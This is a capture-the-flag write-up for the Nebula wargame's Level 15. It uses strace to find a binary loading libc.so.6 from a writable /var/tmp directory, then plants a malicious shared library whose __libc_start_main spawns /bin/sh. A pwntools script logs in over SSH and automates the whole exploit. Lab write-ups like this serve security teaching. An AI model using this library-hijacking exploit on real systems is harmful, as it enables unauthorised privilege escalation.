# Level 15

## Discription

> strace the binary at /home/flag15/flag15 and see if you spot anything out of the ordinary. \
\
> You may wish to review how to “compile a shared library in linux” and how the libraries are loaded and processed by reviewing the dlopen manpage in depth. \
\
> Clean up after yourself :) \
\
> To do this level, log in as the level15 account with the password level15. Files for this level can be found in /home/flag15.

## Solution

As the description says i ran strace on the binary.

```bash
level15@nebula:/home/flag15$ strace ./flag15 
execve("./flag15", ["./flag15"], [/* 19 vars */]) = 0
brk(0)                                  = 0x8a9b000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb770e000
...
stat64("/var/tmp/flag15/cmov", 0xbf828af4) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
...
```

Binary was looking for libc.so.6 in /var/tmp/flag15 directory. But there was no file in /var/tmp/flag15 and we have write permission in that directory. So the challenge was very clear now.

We have to create a shared library named libc.so.6 into /var/tmp/flag15.

Lets write a C program with function \__libc_start_main as libc.so.6 starts with __libc_start_main function.

```C
#include <stdio.h>
__libc_start_main() {
system(/bin/sh);
}
```

Remember while compiling with gcc it asks for a version file that defines the version of the shared library, make a simple file with content - 

```bash
GLIBC_2.0 {};
```

Compile it as static shared library using GCC - 

```bash
gcc -shared -static-libgcc -Wl,--version-script=/var/tmp/flag15/version.txt,-Bstatic /var/tmp/flag15/lib.c -o /var/tmp/flag15/libc.so.6
```

All set, now run the flag15 binary.

![](Images/solution.png) 

## Python

```python
#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level15 = ssh(host=argv[1],user='level15',password='level15')
level15_shell = level15.shell('sh')
level15_shell.sendline("""echo -e '#include <stdio.h>\n__libc_start_main() {\nsystem("/bin/sh");\n}' > /var/tmp/flag15/lib.c""")
level15_shell.sendline("echo 'GLIBC_2.0 {};' > /var/tmp/flag15/version.txt")
level15_shell.sendline("gcc -shared -static-libgcc -Wl,--version-script=/var/tmp/flag15/version.txt,-Bstatic /var/tmp/flag15/lib.c -o /var/tmp/flag15/libc.so.6")
level15_shell.sendline("/home/flag15/flag15")
level15_shell.sendline("getflag")
level15_shell.interactive()
```
